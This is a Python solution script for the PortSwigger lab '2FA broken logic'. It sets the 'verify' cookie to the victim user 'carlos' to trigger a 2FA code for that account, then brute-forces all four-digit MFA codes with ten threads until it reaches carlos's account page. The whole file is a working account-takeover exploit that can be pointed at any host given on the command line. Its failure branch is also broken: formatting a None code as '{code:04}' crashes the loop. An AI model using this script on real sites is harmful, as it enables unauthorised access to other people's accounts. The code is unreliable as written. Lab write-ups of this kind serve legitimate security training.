#!/usr/bin/env python3
# Lab: 2FA broken logic
# Lab-Link: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {}


def try_login(client, host, code):
    data = {'mfa-code': f'{code:04}'}
    print(data)
    r = client.post(f'{host}/login2', data, allow_redirects=True)
    if "Your username is: carlos" in r.text:
        return code
    return None


def main():
    print('[+] Lab: 2FA broken logic')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        # get a valid session token
        client.get(f'{host}/login')
        # session_id = client.cookies.get('session', domain=f'{host[8:]}')

        # Generate a 2FA token for carlos
        client.cookies.set('verify', 'carlos', domain=f'{host[8:]}')
        client.get(f'{host}/login2')

        # Now brute force the 2FA token using ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(try_login, client, host, i) for i in range(10000)]
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    print(f'[+] Login to user carlos successful with code {result}, lab solved')
                    sys.exit(0)
                else:
                    code = int(future.result()) if future.result() is not None else future.result()
                    print(f'[ ] Trying to brute force 2FA code: {code:04}', end='\r')

        print(f'[-] Login to user carlos not successful')


if __name__ == "__main__":
    main()
